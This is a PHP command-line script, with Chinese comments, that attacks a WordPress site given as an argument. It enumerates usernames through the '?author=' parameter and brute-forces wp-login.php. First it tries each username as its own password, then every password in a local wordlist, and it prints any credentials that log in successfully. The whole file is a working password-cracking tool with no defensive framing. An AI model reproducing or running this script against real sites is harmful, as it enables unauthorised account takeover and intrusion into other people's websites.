<?php
 
set_time_limit(0); 
$domain = $argv[1];
 
//获取用户名
for ($i=1; $i <= 10; $i++) {
 
    $url = $domain."/?author=".$i;
    $response = httprequest($url,0);
    if ($response == 404) {
        continue;
    }
    $pattern = "/author\/(.*)\/feed/";
    preg_match($pattern, $response, $name);
    $namearray[] = $name[1];
}
 
echo "共获取用户".count($namearray)."名用户\n";
 
echo "正在破解用户名与密码相同的用户：\n";
 
$crackname = crackpassword($namearray,"same");
 
$passwords = file("pass.txt");
 
echo "正在破解弱口令用户：\n";
 
if ($crackname) {
    $namearray = array_diff($namearray,$crackname);
}
 
crackpassword($namearray,$passwords);
 
function crackpassword($namearray,$passwords){
    global $domain;
    $crackname = "";
    foreach ($namearray as $name) {
        $url = $domain."/wp-login.php";
        if ($passwords == "same") {
            $post = "log=".urlencode($name)."&pwd=".urlencode($name)."&wp-submit=%E7%99%BB%E5%BD%95&redirect_to=".urlencode($domain)."%2Fwp-admin%2F&testcookie=1";
            $pos = strpos(httprequest($url,$post),'div id="login_error"');
            if ($pos === false) {
                echo "$name $name"."\n";
                $crackname[] = $name;
            }
        }else{
            foreach ($passwords as $pass) {
                $post = "log=".urlencode($name)."&pwd=".urlencode($pass)."&wp-submit=%E7%99%BB%E5%BD%95&redirect_to=".urlencode($domain)."%2Fwp-admin%2F&testcookie=1";
                $pos = strpos(httprequest($url,$post),'div id="login_error"');
                if ($pos === false) {
                    echo "$name $pass"."\n";
                }
            }
        }
    }
    return $crackname;
}
 
 
function httprequest($url,$post){
    $ch = curl_init(); 
    curl_setopt($ch, CURLOPT_URL, "$url"); 
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); 
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION,1);
 
    if($post){
        curl_setopt($ch, CURLOPT_POST, 1);//post提交方式
        curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
    }
 
    $output = curl_exec($ch); 
    $httpcode = curl_getinfo($ch,CURLINFO_HTTP_CODE);
    curl_close($ch);
 
 
    if ($httpcode == 404) {
        return 404;
    }else{
        return $output;
    }
}
?>